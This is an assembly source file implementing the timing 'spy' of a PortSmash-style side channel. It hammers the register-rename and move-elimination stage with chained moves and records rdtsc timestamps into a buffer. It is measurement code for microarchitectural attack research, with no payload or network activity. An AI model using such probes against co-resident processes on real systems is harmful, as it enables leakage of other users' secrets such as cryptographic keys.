/* spy.S – move-elimination / rename-stage probe using RDTSC */

#include "attacker.h" 

# args   : rdi = buffer pointer (uint64_t *buffer)
# clobbers: rax, rdx, rcx, rsi, r8–r11

.text
.global rensmash
.p2align 4

rensmash:
    # Seed registers with non-trivial values
    mov %rdi, %r8
    mov %rdi, %r9
    mov %rdi, %r10
    mov %rdi, %r11

    mov $SPY_NUM_TIMINGS, %rcx   # number of samples

1:
    lfence
    rdtsc              # tsc -> edx:eax
    lfence
    mov %rax, %rsi     # save START low 32 bits in rsi (like original PortSmash)

    # --- MOVE-ELIMINATION PRESSURE LOOP ---
    .rept 256
        mov %r8,  %r9
        mov %r9,  %r10
        mov %r10, %r11
        mov %r11, %r8
    .endr
    # --------------------------------------

    lfence
    rdtsc              # tsc -> edx:eax (END timestamp)

    # Encode (end_tsc_low32, start_tsc_low32) into one 64-bit word
    # This matches the original PortSmash encoding so parsing is easy.
    shl $32, %rax      # end_low32 in high half
    or  %rsi, %rax     # start_low32 in low half

    mov %rax, (%rdi)   # store into buffer
    add $8, %rdi       # advance pointer
    dec %rcx
    jnz 1b

    ret